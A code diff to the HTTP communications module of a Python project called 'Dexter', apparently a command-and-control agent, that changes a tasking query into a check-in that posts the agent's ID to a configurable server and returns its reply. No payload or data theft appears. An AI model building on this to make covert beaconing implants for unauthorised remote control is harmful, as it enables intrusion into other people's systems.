@@ -11,8 +11,7 @@ import binascii
 import argparse
 
 # Dexter specific imports
-import dexter
-import commTemplate
+from Dexter.comms import commTemplate
 
 
 class httpComm(commTemplate.commTemplate):
@@ -23,16 +22,20 @@ class httpComm(commTemplate.commTemplate):
         pass
 
     # Function to query for tasking
-    def getTasking(self):
-        # Query scrape page for tasking
+    def checkIn(self, dexterId):
+        # HTTP POST request setup
         url = 'http://' + str(self.server) + ':' + str(self.port) + '/dexter.html'
         headers = {'User-Agent' : 'Dexter 1.0',
                    'Accept-Encoding' : 'gzip',
                    'Connection' : 'Close'}
-        req = urllib.request.Request(url, bytes('Dexter, reporting for duty!', 'ascii'), headers)
-        page = urllib.request.urlopen(req, timeout=20)
-        response = page.read()
-        print(response)
+                   
+        try:
+            req = urllib.request.Request(url, bytes('Dexter ' + dexterId + ', reporting for duty!', 'ascii'), headers)
+            page = urllib.request.urlopen(req, timeout=20)
+            response = page.read()
+        except:
+            response = 'Failed'
+            
         return response
 
 
@@ -44,7 +47,8 @@ if __name__ == '__main__':
     args = parser.parse_args()
     
     mod = httpComm(args.server, args.port)
-    mod.getTasking()
+    response = mod.checkIn('TESTTESTTEST')
+    print(response)
     
 
     pass	
